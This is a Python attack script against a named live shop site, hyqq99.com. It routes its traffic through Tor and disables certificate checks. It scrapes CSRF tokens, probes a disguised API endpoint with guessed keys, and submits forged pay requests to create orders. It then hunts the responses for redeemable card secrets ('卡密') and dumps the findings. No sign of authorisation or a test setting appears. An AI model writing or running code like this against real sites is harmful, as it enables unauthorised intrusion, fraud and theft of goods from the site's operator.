#!/usr/bin/env python3
"""Final hyqq99 probes: CSRF pay, ajax query 500 confirm, %61pi with Origin."""
import json
import re
import time
import subprocess
from pathlib import Path

import requests

OUT = Path("/data/recon/hyqq99.com")
BASE = "https://hyqq99.com/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}


def log(*a):
    print(*a, flush=True)


def main():
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    s.headers.update(
        {
            "User-Agent": UA,
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Referer": BASE + "/",
            "Origin": "https://hyqq99.com",
        }
    )

    out = {"kami_found": False}
    r = s.get(BASE + "/", timeout=45)
    log("home", r.status_code, len(r.content), list(s.cookies.keys()))
    csrf = None
    # csrf.js / inline
    m = re.search(r"csrf[_-]?token[\"'\s:=]+([a-f0-9]{16,})", r.text, re.I)
    if m:
        csrf = m.group(1)
    # also from csrf.js fetch pattern
    js = re.search(r'src=["\']([^"\']*csrf\.js[^"\']*)["\']', r.text)
    if js:
        jr = s.get(BASE + "/" + js.group(1).lstrip("./") if not js.group(1).startswith("http") else js.group(1), timeout=20)
        # path relative
        if jr.status_code != 200:
            jr = s.get("https://hyqq99.com/shop/assets/js/csrf.js", timeout=20)
        log("csrf.js", jr.status_code, jr.text[:300] if jr.ok else jr.text[:100])
        (OUT / "probe" / "csrf.js").write_text(jr.text if jr.ok else "", encoding="utf-8")
        m2 = re.search(r"([a-f0-9]{32,})", jr.text or "")
        if not csrf and m2:
            csrf = m2.group(1)
    # meta / cookie
    if not csrf:
        m = re.search(r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)', r.text)
        if m:
            csrf = m.group(1)
    # from earlier extract pattern on homepage
    ms = re.findall(r"([a-f0-9]{64})", r.text)
    log("csrf", csrf, "sha64s", len(ms), ms[:3])
    out["csrf"] = csrf

    # getcount + query
    g = s.get(
        BASE + "/ajax.php?act=getcount",
        headers={"X-Requested-With": "XMLHttpRequest"},
        timeout=30,
    )
    log("getcount", g.text)
    out["getcount"] = g.text
    q = s.get(
        BASE + "/ajax.php?act=query&page=1",
        headers={"X-Requested-With": "XMLHttpRequest"},
        timeout=30,
    )
    log("query", q.status_code, q.text[:300])
    out["ajax_query"] = {"code": q.status_code, "body": q.text[:500]}

    # %61pi with Origin
    api = []
    for qs in [
        "act=search&id=1",
        "act=search&id=100",
        "act=search&id=12649",
        "act=tools&key=",
        "act=tools&key=123456&limit=1",
        "act=tools&key=hysc99&limit=1",
        "act=site",
        "act=goodslist",
        "act=classlist",
    ]:
        try:
            ar = s.get(BASE + "/%61pi.php?" + qs, timeout=25)
            log("api61", qs, ar.status_code, ar.text[:220])
            api.append({"qs": qs, "code": ar.status_code, "body": ar.text[:400]})
        except Exception as e:
            log("api61 err", qs, e)
            api.append({"qs": qs, "err": str(e)[:180]})
        time.sleep(0.8)
    out["api61"] = api

    # buy + pay with csrf
    br = s.get(BASE + "/?mod=buy&tid=13", timeout=40)
    (OUT / "probe" / "buy_13.html").write_text(br.text, encoding="utf-8")
    hm = re.search(r"var hashsalt=(.+?);", br.text or "")
    hs = ""
    if hm:
        hs = subprocess.run(
            ["node", "-e", f"console.log({hm.group(1)})"],
            capture_output=True,
            text=True,
            timeout=10,
        ).stdout.strip()
    # csrf may be in buy page too
    if not csrf:
        m = re.search(r"csrf[_-]?token[\"'\s:=]+([a-f0-9]{16,})", br.text, re.I)
        if m:
            csrf = m.group(1)
            out["csrf"] = csrf
    # also var csrf_token = '...'
    m = re.search(r"csrf_token\s*=\s*[\"']([^\"']+)[\"']", br.text)
    if m:
        csrf = m.group(1)
        out["csrf"] = csrf
        log("csrf from buy", csrf)

    payloads = [
        {"tid": "13", "inputvalue": "13800138000", "num": "1", "hashsalt": hs},
    ]
    if csrf:
        payloads.append(
            {
                "tid": "13",
                "inputvalue": "13800138000",
                "num": "1",
                "hashsalt": hs,
                "csrf_token": csrf,
            }
        )
        payloads.append(
            {
                "tid": "13",
                "inputvalue": "13800138000",
                "num": "1",
                "hashsalt": hs,
                "token": csrf,
            }
        )

    pays = []
    for p in payloads:
        headers = {"X-Requested-With": "XMLHttpRequest"}
        if csrf:
            headers["X-CSRF-TOKEN"] = csrf
        pr = s.post(BASE + "/ajax.php?act=pay", data=p, headers=headers, timeout=30)
        log("pay", list(p.keys()), pr.status_code, pr.text[:300])
        pays.append({"keys": list(p.keys()), "body": pr.text[:400]})
        # if order created
        try:
            j = pr.json()
            if j.get("code") == 0:
                tn = j.get("trade_no")
                log("ORDER", tn, j)
                out["order"] = j
                # query order page
                qr = s.get(BASE + f"/?mod=query&data={tn}", timeout=40)
                kami = re.findall(r"卡密[^<]{0,100}", qr.text)
                log("order query kami", kami[:5])
        except Exception:
            pass
    out["pays"] = pays

    # goodsdetails like siye
    for act in ["goodsdetails", "getgoods", "getGoods"]:
        for data in [{"tid": "13"}, {"tid": 13}]:
            pr = s.post(
                BASE + f"/ajax.php?act={act}",
                data=data,
                headers={"X-Requested-With": "XMLHttpRequest"},
                timeout=25,
            )
            log("act", act, data, pr.status_code, pr.text[:220])

    # cron oracle
    cr = s.get(BASE + "/cron.php", timeout=15)
    log("cron", cr.text[:200])
    out["cron"] = cr.text[:200]

    blob = json.dumps(out, ensure_ascii=False)
    out["kami_found"] = bool(re.search(r"(卡密|kami)[:：\s\"'][^\"']{6,}", blob, re.I))
    (OUT / "dump" / "FINAL.json").write_text(
        json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("KAMI", out["kami_found"])
    log("DONE")


if __name__ == "__main__":
    main()
